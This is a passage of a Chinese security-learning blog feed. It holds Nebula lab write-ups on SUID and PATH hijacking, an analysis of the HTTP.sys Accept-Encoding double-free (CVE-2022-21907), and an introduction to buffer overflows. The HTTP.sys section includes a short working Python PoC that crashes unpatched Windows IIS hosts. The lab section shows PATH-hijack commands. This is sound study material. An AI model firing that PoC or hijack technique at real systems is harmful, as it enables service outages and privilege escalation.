是一个用来<strong>在当前环境中查找并执行命令</strong>的工具。</p></blockquote><p>简单来说，env的参数是要执行的Shell命令，env会遍历PATH环境变量中的路径来寻找要执行的命令。env命令常出现在脚本文件的第一行，比如</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br></pre></td></tr></table></figure><blockquote><p><code>#!</code> 是什么？</p><ul><li>被称为 <strong>shebang</strong>（或 hashbang），是 Unix/Linux 系统对脚本文件的一种约定。</li><li>它告诉系统：<strong>用哪个程序来解释运行这个脚本</strong>。</li></ul><p><code>/usr/bin/env</code> 是什么？</p><ul><li><code>env</code> 是一个程序，可以<strong>在当前环境变量中查找并执行命令</strong>。</li><li>它通过 <code>PATH</code> 环境变量自动查找你系统中 <code>python3</code> 的位置。</li></ul><p><code>python</code> 是什么？</p><ul><li>指定使用 <code>python</code> 作为脚本解释器。</li><li>也就是说，这个脚本会被当作 Python 代码来执行。</li></ul></blockquote><p>这样写的好处是为了防止把位置写死，如果写成<code>#!/usr/bin/python</code>的话，在其他一些系统中，~python~命令未必在<code>/usr/bin</code>目录中。用了env，不管python在哪个目录中，只要目录列在PATH环境变量中，就可以被找到。</p><p>所以，真正的问题是出现在PATH变量上，虽然调用的参数无法被控制，但它执行命令受限于外部PATH变量，而PATH变量是可控的。env是依次遍历PATH变量中的目录，只要我们让env优先找到伪装的echo命令，就起到了劫持作用。</p><p>并且可以看到flag01为rwsr，说明被设置了SUID，所以会以flag01用户运行程序，</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250602173833992.png" alt="image-20250602173833992"></p><p>我们可以让<code>/tmp/echo</code>链接到<code>/bin/getflag</code>上，然后修改PATH环境变量，把<code>/tmp</code>放在最前面，这样env会首先在<code>/tmp</code>下找到echo并执行（并且是以flag01身份运行）。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250602174703978.png" alt="image-20250602174703978"></p><blockquote><div class="table-container"><table><thead><tr><th>命令部分</th><th>含义</th></tr></thead><tbody><tr><td><code>ln</code></td><td>创建链接（link）</td></tr><tr><td><code>-s</code></td><td>创建<strong>符号链接</strong>（symbolic link），也叫软链接</td></tr><tr><td><code>/bin/getflag</code></td><td>目标文件，链接所指向的文件（原文件）</td></tr><tr><td><code>/tmp/echo</code></td><td>链接文件的路径，即你要创建的“快捷方式”</td></tr></tbody></table></div><p>执行 <code>/tmp/echo</code>，系统会自动跳转去执行 <code>/bin/getflag</code>。</p><p><code>PATH=/tmp:$PATH</code>将当前 PATH 变量设置为：/tmp:&lt;原来的PATH值&gt;</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Exploit-Excercise-Nebula </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Exploit-Excercise-Nebula-0</title>
      <link href="/2025/06/02/Exploit-Excercise-Nebula-0/"/>
      <url>/2025/06/02/Exploit-Excercise-Nebula-0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Exploit-Exercise是一个Linux平台下漏洞挖掘、分析的练习平台。<a href="https://download.vulnhub.com/exploitexercises/exploit-exercises-nebula-5.iso">下载地址</a></p><p>官方提供了个很多虚拟机、文档、挑战题目，用于学习各种计算机安全问题，如权限提升、漏洞分析、Exploit开发、调试、逆向工程和通用的网络安全问题。</p><h2 id="Level-00——寻找特权程序"><a href="#Level-00——寻找特权程序" class="headerlink" title="Level 00——寻找特权程序"></a>Level 00——寻找特权程序</h2><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><p>这一关需要你找到一个以“flag00”账户运行的“设置用户 ID”程序。你也可以通过仔细检查/目录下的顶层目录中是否存在可疑目录来找到它。</p><h3 id="Solution："><a href="#Solution：" class="headerlink" title="Solution："></a>Solution：</h3><p>根据题目描述，本关需要在系统中搜索一个设置了SUID的程序，这个程序将是以flag00身份运行的。</p><blockquote><p>SUID（Set User ID）是 Linux 和 Unix 系统中一种特殊的文件权限机制，常用于<strong>可执行文件</strong>。它允许普通用户在运行该程序时<strong>临时获得该程序文件所有者的权限</strong>，通常是 root 权限。</p></blockquote><p>要完成本关，需要掌握<code>find</code>命令的用法。find命令的格式如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find [path...] [expression]</span><br></pre></td></tr></table></figure><p>expression可以跟选项。根据题目要求，我们要查找一个所属于flag00账号的可执行程序。find有一个选项叫-uid，后面跟用户的uid值。每个Linux账号都对应一个uid，且不重复。账户的UID可以用命令<code>id</code>查看：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250601181616755.png" alt="image-20250601181616755"></p><p>得到flag00用户的UID为999，接着从根目录”/“开始搜素这个神秘的程序：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250601182021026.png" alt="image-20250601182021026"></p><div class="table-container"><table><thead><tr><th>部分</th><th>含义</th></tr></thead><tbody><tr><td><code>find /</code></td><td>从根目录 <code>/</code> 开始递归查找</td></tr><tr><td><code>-uid 999</code></td><td>查找<strong>属主用户 ID 是 999</strong> 的文件</td></tr><tr><td><code>2&gt;/dev/null</code></td><td>把<strong>标准错误输出（stderr）重定向</strong>到 <code>/dev/null</code>，即隐藏错误信息，比如“权限不够”、“没有访问权限”等</td></tr></tbody></table></div><p>由于当前用户是level00，在进一些没有权限进入的目录进行搜索时，是会出错的，所以用<code>2&gt;/dev/null</code>将错误输出到/<code>dev/null</code>这个空白设备里。Linux标准输入、标准输出、标准错误输出分别对应0、1和2。</p><p>搜索结果中，/home/bin/…/flag00/比较特殊，应该是我们要的程序：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250601190649651.png" alt="image-20250601190649651"></p><p>按照提示，我们已经拥有了flag00的权限，执行getflag：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250601190741287.png" alt="image-20250601190741287"></p>]]></content>
      
      
      <categories>
          
          <category> Exploit-Excercise-Nebula </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP协议漏洞分析</title>
      <link href="/2025/05/31/HTTP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2025/05/31/HTTP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP协议漏洞"><a href="#HTTP协议漏洞" class="headerlink" title="HTTP协议漏洞"></a>HTTP协议漏洞</h1><h2 id="1-CVE-2021-31166"><a href="#1-CVE-2021-31166" class="headerlink" title="1. CVE-2021-31166"></a><a href="https://www.cve.org/CVERecord?id=CVE-2021-31166">1. CVE-2021-31166</a></h2><p>跟CVE-2022-211907一样道理。</p><h2 id="2-CVE-2022-21907"><a href="#2-CVE-2022-21907" class="headerlink" title="2. CVE-2022-21907"></a><a href="https://www.cve.org/CVERecord?id=CVE-2022-21907">2. CVE-2022-21907</a></h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>“Accept-Encoding” HTTP 标头字段值具有以下格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Accept-Encoding = #( codings [ weight ] )</span><br><span class="line">codings= content-coding / &quot;identity&quot; / &quot;*&quot;</span><br><span class="line">weight= &quot;;q=&quot; qvalue</span><br><span class="line">qvalue= ( &quot;0&quot; [ &quot;.&quot; 0*3DIGIT ] ) / ( &quot;1&quot; [ &quot;.&quot; 0*3(&quot;0&quot;) ] )</span><br></pre></td></tr></table></figure><p>示例“Accept-Encoding”标头如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Accept-Encoding: *</span><br><span class="line">Accept-Encoding: deflate, gzip;q=1.0, *;q=0.5</span><br></pre></td></tr></table></figure><p>其中字段值字符串是gzip、identity、<em>*、deflate、 gzip;q=1.0, </em>;q=0.5在HTTP.sys中的例程HTTP!UlAcceptEncodingHeaderHandler、HTTP!UlpParseAcceptEncoding和HTTP！UlpParseContentCoding负责解析“Accept-Encoding”HTTP 请求标头。</p><hr><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>HTTP 协议栈远程代码执行漏洞，Internet Information Services (IIS) 是一种灵活、可扩展、安全且可管理的 Web 服务，用于托管 Web 上的静态和动态内容。IIS 支持各种 Web 技术，包括 HTML、ASP、ASP.NET、JSP、PHP 和 CGI。此功能通过称为 http 协议栈 ( http.sys ) 的内核模式设备驱动实现。此驱动程序负责解析 http 请求并对客户端响应。<br>漏洞出现在http.sys内，未授权的攻击者可以构造恶意请求包攻击目标服务器，成功利用该漏洞的攻击者可导致目标服务器蓝屏，或执行任意代码。</p><p>超文本传输协议（HTTP）是一个用于传输超媒体文档（例如HTML）的应用层协议。它是为Web浏览器与Web服务器之间的通信而设计的，Windows上的HTTP协议栈用于Windows上的Web服务器，如IIS，若该协议栈相关的组件存在漏洞，则可能导致远程恶意代码执行。经分析，CVE-2021-31166漏洞影响可稳定触发BSoD（Blue Screen of Death，缩写BSoD，指微软Windows操作系统在无法从一个系统错误中恢复过来时显示的蓝屏死机图像）。该漏洞被微软官方标记为Wormable（蠕虫级）和Exploitation More Likely（更可能被利用），这意味着漏洞利用可能性很大，恶意攻击者有可能通过利用该漏洞制造蠕虫病毒攻击。</p><hr><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><div class="table-container"><table><thead><tr><th>攻击者</th><th>受害者</th></tr></thead><tbody><tr><td>Windows 11</td><td>Windows 10 2004版(20H1)</td></tr></tbody></table></div><p>poc代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Please input your host...\n&quot;</span>)</span><br><span class="line">host = <span class="built_in">input</span>()</span><br><span class="line"> </span><br><span class="line">poc = requests.get(<span class="string">f&#x27;http://<span class="subst">&#123;host&#125;</span>/&#x27;</span>, headers = &#123;<span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;A, ,&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure><p>然后在Win10中开启IIS：</p><p>打开控制面板-启用关闭Windows功能-开启Internet Information Services&amp;Internet Information Services可承载的Web核心</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250530192051715.png" alt="image-20250530192051715"></p><p>这里我的Virtualbox中Win10使用的是桥接模式，要保证能和主机互相ping通：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250530200005079.png" alt="image-20250530200005079"></p><p>在cmd中输入<code>ipconfig/all</code>查看Win10本机的ip地址，然后在浏览器中打开本机的ip地址就可以看到IIS服务：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250530192337727.png" alt="image-20250530192337727"></p><p>在攻击者机器中输入如下，便可造成Windows 10中的BSoD蓝屏。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250531213942626.png" alt="image-20250531213942626"></p><hr><h3 id="漏洞原因分析："><a href="#漏洞原因分析：" class="headerlink" title="漏洞原因分析："></a>漏洞原因分析：</h3><p>将dump文件在Windgb中打开进行分析：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250531002054016.png" alt="image-20250531002054016"></p><p>使用<code>kd&gt;k</code>进行栈回溯：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250531131245924.png" alt="image-20250531131245924"></p><p>发现是调用了<code>HTTP!UIFreeUnknownCodingList</code>函数之后才引发的<code>KiRaiseSecurityCheckFailure</code>报错。</p><p>调用如下：</p><p> ───&gt; nt!KiStartSystemThread+0x28<br> │    ├──&gt; nt!PspSystemThreadStartup+0x55<br> │    │    ├──&gt; HTTP!UlpThreadPoolWorker+0x112<br> │    │    │    ├──&gt; HTTP!UlpHandleRequest+0x1aa<br> │    │    │    │    ├──&gt; HTTP!UlpParseNextRequest+0x1ff<br> │    │    │    │    │    ├──&gt; HTTP!UlParseHttp+0xac7<br> │    │    │    │    │    │    ├──&gt; HTTP!UlParseHeader+0x218<br> │    │    │    │    │    │    │    ├──&gt; HTTP!UlAcceptEncodingHeaderHandler+0x51<br> │    │    │    │    │    │    │    │    ├──&gt; HTTP!UlpParseAcceptEncoding+0x298f5<br> │    │    │    │    │    │    │    │    │    ├──&gt; HTTP!UlFreeUnknownCodingList+0x63<br> │    │    │    │    │    │    │    │    │    │    ├──&gt; nt!KiRaiseSecurityCheckFailure+0x323<br> │    │    │    │    │    │    │    │    │    │    │    ├──&gt; nt!KiFastFailDispatch+0xd0<br> │    │    │    │    │    │    │    │    │    │    │    │    ├──&gt; nt!KiBugCheckDispatch+0x69<br> │    │    │    │    │    │    │    │    │    │    │    │    │    └──&gt; nt!KeBugCheckEx</p><p>这里整理一下调用关系：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">UlParseHttp -&gt; UlParseHeader -&gt; UlAcceptEncodingHeaderHandler -&gt; UlpParseAcceptEncoding</span><br><span class="line">（解析请求）     （解析 HTTP 头）   （解析 Accept-Encoding 字段）      （解析 Accept-Encoding 内容）</span><br></pre></td></tr></table></figure><p>使用<code>kd&gt;!analyze -v</code>自动分析bug信息报告：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250531002550523.png" alt="image-20250531002550523"></p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250531002654318.png" alt="image-20250531002654318"></p><p>可以看到是由于<code>LIST_ENTRY</code>的双重释放而造成的蓝屏，并且可以看到造成问题的程序是HTTP.sys。然后我们可以在<code>C:\Windows\System32\drivers</code>中找到<code>http.sys</code>文件。</p><p>分析DUMP，调用栈可见异常出现在UlFreeUnknownCodingList函数内，该函数由<code>UlpParseAcceptEncoding</code>调用，接下来对这两个函数进行分析。先再IDA中打开对<code>UlpParseAcceptEncoding</code>函数分析。</p><h4 id="1-构建链表UlpParseAcceptEncoding"><a href="#1-构建链表UlpParseAcceptEncoding" class="headerlink" title="1. 构建链表UlpParseAcceptEncoding"></a>1. 构建链表UlpParseAcceptEncoding</h4><p>它会循环解析 Accept-Encoding 中的编码方式，首先通过 <code>UlpParseContentCoding</code> 函数依次获取每个编码信息，如果是支持的编码方式，则设置相应位；如果是 没有被识别出的其他编码方式，则调用 <code>ExAllocatePoolWithTagPriority</code> 函数申请 0x20 字节大小的堆空间来存放这些信息，然后将它们链到 <code>UnknownCodingList</code> 中，其中<code>UnknownCodingList</code> 是一个双向循环链表：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250531162951023.png" alt="image-20250531162951023"></p><h4 id="2-更换为Request链表头"><a href="#2-更换为Request链表头" class="headerlink" title="2. 更换为Request链表头"></a>2. 更换为Request链表头</h4><p>上述构建链表过程通过循环调用，直到获取完所有编码后，会进入一个判断分支，除非<code>UnknownCodingList</code>不为空链表且链头前后链接无异常，就会将 <code>UnknownCodingListHead</code> 取下，然后把 <code>Request</code>对象的<code>UnknownCodingListHead</code>链入：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250531185349799.png" alt="image-20250531185349799"></p><p>对关系进行整理如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//*************如果满足以下任意条件，则会调用 __fastfail(3u)*************</span></span><br><span class="line"><span class="comment">//校验 UnknownCodingListHead 前后关系</span></span><br><span class="line">UnknownCodingListHead.Flink-&gt;Blink != &amp;UnknownCodingListHead</span><br><span class="line">UnknownCodingListHead.Blink-&gt;Flink != &amp;UnknownCodingListHead</span><br><span class="line"><span class="comment">//将 UnknownCodingListHead 取下</span></span><br><span class="line">UnknownCodingListHead.Blink-&gt;Flink = UnknownCodingListHead.Flink</span><br><span class="line">UnknownCodingListHead.Flink-&gt;Blink = UnknownCodingListHead.Blink</span><br><span class="line"><span class="comment">//判断 RequestUnknownCodingListHead 是否为空</span></span><br><span class="line">Request-&gt;UnknownCodingListHead.Flink-&gt;Blink != &amp;Request-&gt;UnknownCodingListHead</span><br><span class="line">Request-&gt;UnknownCodingListHead.Blink-&gt;Flink != &amp;Request-&gt;UnknownCodingListHead</span><br><span class="line"><span class="comment">//校验 UnknownCodingListHead-&gt;Flink 前后关系</span></span><br><span class="line">UnknownCodingListHead-&gt;Flink-&gt;Flink-&gt;Blink != UnknownCodingListHead-&gt;Flink</span><br><span class="line">UnknownCodingListHead-&gt;Blink-&gt;Flink-&gt;Flink != UnknownCodingListHead-&gt;Flink</span><br><span class="line"><span class="comment">//***********判断条件通过之后，将 RequestUnknownCodingListHead 链进去***********</span></span><br><span class="line">Request-&gt;UnknownCodingListHead.Blink-&gt;Flink = UnknownCodingListHead-&gt;Flink</span><br><span class="line">Request-&gt;UnknownCodingListHead.Blink = UnknownCodingListHead.Flink-&gt;Blink</span><br><span class="line">UnknownCodingListHead.Flink-&gt;Blink-&gt;Flink = &amp;Request-&gt;UnknownCodingListHead</span><br><span class="line">UnknownCodingListHead.Flink-&gt;Blink = Request-&gt;UnknownCodingListHead.Blink</span><br></pre></td></tr></table></figure><p>在上一步更换链头的过程中，虽然已经将链表头由<code>UnknownCodingListHead</code>更换为<code>Request-&gt;UnknownCodingListHead</code>，但是并没有 <code>UnknownCodingListHead</code>将清空，通过<code>UnknownCodingListHead</code> 还是可以访问 <code>UnknownCodingListHead-&gt;Flink</code> 和 <code>UnknownCodingListHead-&gt;Blink</code>，即，<code>UnknownCodingListHead</code> 中依然保留可以操控原来链表的指针，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/cve-2022-21907.drawio.png" alt="cve-2022-21907.drawio"></p><p>图中左右侧箭头都表示节点的前后指针，在更换链表头后，没有将<code>UnknownCodingListHead</code>置为空指针。</p><h4 id="3-参数判定"><a href="#3-参数判定" class="headerlink" title="3. 参数判定"></a>3. 参数判定</h4><p>回到前面，在进行判断时：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250531194701386.png" alt="image-20250531194701386"></p><p>在此之后，程序进入判断如果<code>v5&lt;0</code>，则跳转到LABEL_33:</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250531194759680.png" alt="image-20250531194759680"></p><p>LABEL_33处会判断<code>UnknownCodingList</code> 是否为空，如果不为空就调用 <code>UlFreeUnknownCodingList</code>函数，且参数为<code>&amp;UnknownCodingListHead</code>。由于 <code>UnknownCodingListHead</code> 已经不在循环双链表中，按照这个流程对<code>UnknownCodingList</code>进行释放就会出现双重释放的问题。</p><p> 因此，要触发此漏洞，要使得v5的值小于0，通过对于v5进行溯源，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250531200420395.png" alt="image-20250531200420395"></p><p> v5作为函数<code>UlpParseContentCoding</code>的返回值，若 v5 小于 0 且不等于 0xC0000225，则逻辑转移至 LABEL_46，这会进一步导致程序逻辑跳过将<code>RequestUnknownCodingListHead</code>链进链表的过程，在 <code>UlFreeUnknownCodingList</code> 函数中释放 <code>UnknownCodingList</code> 时，不会出现双重释放的问题。</p><p>综上，只有当 v5 为 0xC0000225，且<code>UnknownCodingList</code>不为空时，才会进行前文中分析的链表操作，且在最后判断 <code>v5 &lt; 0</code> 后，跳到 LABEL_33 去执行<code>UlFreeUnknownCodingList</code> 函数，于是就引起了双重释放。</p><p>为了让<code>UlpParseContentCoding</code>函数的返回值等于0xC0000225，才能使得程序进入漏洞触发逻辑，观察<code>UlpParseContentCoding</code>函数：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250531201534518.png" alt="image-20250531201534518"></p><p>函数最终的返回值是v12。v9通过参数a2进行传递，而a2是当前解析剩余长度：</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250531201454172.png" alt="image-20250531201454172"></p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250531214534486.png" alt="image-20250531214534486"></p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250531201825354.png" alt="image-20250531201825354"></p><p> 最终，当v9的值为0时，将返回值v12赋值为0xC0000225，并跳转至返回逻辑。综上，在函数<code>UlpParseContentCoding</code>中， 因此要使得v9的值为0，可将最后一个参数设定为空格，在进入<code>UlpParseContentCoding</code>后，a2的值为1，v9会被赋值为1，并且第一个编码字符A是未知编码字符，通过循环自减一次后会退出，使得v9的值为0。使得上图判断条件成立后，作为函数返回值的参数v12会被进一步赋值为0xc0000225，最终使得程序进入双重释放的漏洞分支逻辑。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2025/05/15/%E7%BD%91%E7%BB%9C%E4%B8%AD%E6%9C%89%E7%A7%98%E5%AF%86%E5%90%97/"/>
      <url>/2025/05/15/%E7%BD%91%E7%BB%9C%E4%B8%AD%E6%9C%89%E7%A7%98%E5%AF%86%E5%90%97/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>缓冲区溢出攻击</title>
      <link href="/2025/05/14/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
      <url>/2025/05/14/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="缓冲区溢出攻击"><a href="#缓冲区溢出攻击" class="headerlink" title="缓冲区溢出攻击"></a>缓冲区溢出攻击</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>哎，提前进组压力真的很大，奉劝大家还是不要提前进组吧。学长叫你干的活你又不懂，md又push你，老师又要叫你做PPT汇报，感觉已经成了一种恶性循环。</p><h2 id="程序的内存布局"><a href="#程序的内存布局" class="headerlink" title="程序的内存布局"></a>程序的内存布局</h2><p>为了深入理解缓冲区溢出攻击的工作原理，需要了解进程中的内存是如何分布的。对于一个典型的C语言程序，它的内存由5个段组成，每一个段都有不同的用途。下图展示了这5个段在进程中的分布。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250514142640725.png" alt="image-20250514142640725"></p><ol><li>代码段（text segment）：存放程序的可执行代码。这一内存块通常是只读的。</li><li>数据段（data segment）：存放由程序员初始化的静态/全局变量。例如，static int a=3 定义的变量a将会存储在数据段中。</li><li>BSS段（BSS segment）：存放未初始化的静态/全局变量。操作系统将会用0填充这个段，因此所有未初始化的变量都会被初始化为0。例如，static int b 所定义的静态变量b将保存在BSS段中，并且被初始化为0。</li><li>堆（heap）：用于动态内存分配。这一内存区由malloc()、calloc()、realloc()、free()等函数管理。</li><li>栈（stack）：用于存放函数内定义的局部变量，或者和函数调用有关的数据，如返回地址和参数等。后续将详细介绍这个部分。</li></ol><p>为了理解不同内存段是如何被程序使用的，来看下面的代码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//data stored on stack</span></span><br><span class="line"><span class="type">int</span> a=<span class="number">2</span>;</span><br><span class="line"><span class="type">float</span> b=<span class="number">2.5</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> y;</span><br><span class="line"></span><br><span class="line"><span class="comment">//allocate memory on heap</span></span><br><span class="line"><span class="type">int</span> *ptr=(<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="number">2</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//values 5 and 6 stored on heap</span></span><br><span class="line">ptr[<span class="number">0</span>]=<span class="number">5</span>;</span><br><span class="line">ptr[<span class="number">1</span>]=<span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//deallocate memory on heap</span></span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的程序中，变量x是程序中初始化的全局变量，因此这个变量会被分配到数据段中。变量y是一个未初始化的静态变量，因此y被分配至BSS段。变量a和b时局部变量，因此它们保存在程序得栈中。变量ptr也是一个局部变量，因此它也被分配至栈中保存。然而ptr是指针类型，它指向一个由malloc()函数动态分配的内存块，因此，当数值5和6分别被赋值给ptr[0]和ptr[1]时，它们被保存在堆中。</p><hr><h2 id="栈与函数调用"><a href="#栈与函数调用" class="headerlink" title="栈与函数调用"></a>栈与函数调用</h2><p>栈和堆都有可能发生溢出，但是对于这两种溢出的利用方法却有很大差别。本章着重谈论栈溢出。为了理解它的工作机制，需要深入理解栈的工作原理以及在栈中存储的信息。</p><h3 id="栈的内存布局"><a href="#栈的内存布局" class="headerlink" title="栈的内存布局"></a>栈的内存布局</h3><p>栈中存储了函数调用时使用的数据。一个程序的执行过程是由一些列的函数调用构成的。当一个函数被调用时，需要在栈中为该函数分配一些空间以执行该函数。例如，以下func()函数的示例代码中包含两个整型参数（a和b）及两个整型局部变量（x和y）。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> x,y;</span><br><span class="line"></span><br><span class="line">x=a+b;</span><br><span class="line">y=a-b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当func()函数被调用时，操作系统将在栈顶为其分配一块内存空间，这块内存空间称为栈帧。栈帧布局如下，一个栈帧拥有以下4个关键区域。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250514235915971.png" alt="image-20250514235915971"></p><ol><li>参数：这个区域用于保存传递给函数的参数。在示例中，func()函数拥有两个整型参数。当这个函数被调用时，例如func(5,8)，参数的值将会被压入栈中。值得注意的是，参数是以相反的顺序压入栈中。介绍完帧指针后将讨论这样做的原因。</li><li>返回地址：当函数结束并执行返回指令时，它需要知道返回地址，也就是需要将返回地址存在某个地方。在调用一个函数之前，计算机把下一条指令（函数调用指令的下一条指令）的地址压入栈顶，这就是栈帧中的返回地址区域。</li><li>前帧指针：下一个被程序压入栈帧中的数据是上一个栈帧的指针。后面会详细解释前帧指针。</li><li>局部变量：该区域用于存放函数的局部变量。在实际情况中，该区域的布局取决于编译器，例如局部变量的存储顺序、区域的实际大小，等等。一些编译器可能随机设置局部变量的存储顺序，或者为这个区域分配多余的空间。程序员不应假定该区域的大小以及变量在该区域中的顺序。</li></ol><h3 id="帧指针"><a href="#帧指针" class="headerlink" title="帧指针"></a>帧指针</h3><p>在func()函数中，需要访问参数和局部变量。访问参数和局部变量的唯一方法是通过它们的内存地址。然而，这些地址在编译时并不能确定，因为编译器无法预测栈的运行时状态，也就无法得到栈帧的位置。为了解决这个问题，<strong>CPU引入了一个专门的寄存器，叫做帧指针。这个寄存器指向栈帧中的一个固定地址，因此参数和局部变量的地址可以通过这个寄存器加上一个偏移值计算得到</strong>。偏移值在编译时确定，<strong>而帧指针的值却决于运行时栈帧被分配至栈的哪个位置</strong>。</p><p>下面通过一个例子来观察帧指针的使用情况。之前的示例代码表明，函数将执行x=a+b。CPU需要获取a和b的值，把它们相加得到的结果存在x中，因此CPU需要知道这三个变量的地址。如图4.2所示，<strong>在x86架构中，帧指针寄存器（ebp）总是指向前一个帧指针保存的地址。</strong>对于32位体系架构而言，返回地址以及帧指针各占据4个字节，因此参数a和b的实际地址分别是ebp+8和ebp+12。所以，x=a+b的汇编代码如下：（可以使用”gcc -S”选项把C语言代码编译成汇编代码：gcc -S\<filename>）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl12(%ebp), %eax; b的地址是%ebp+12</span><br><span class="line">movl8(%ebp), %edx; a的地址是%ebp+8</span><br><span class="line">addl%edx, %eax</span><br><span class="line">movl%eax, -8(%ebp); x的地址是%ebp-8</span><br></pre></td></tr></table></figure><p>在上面的汇编代码中，eax和edx是两个通用寄存器，用于存放临时的计算结果。”movl u w”指令将u的值复制到w，”addl %edx 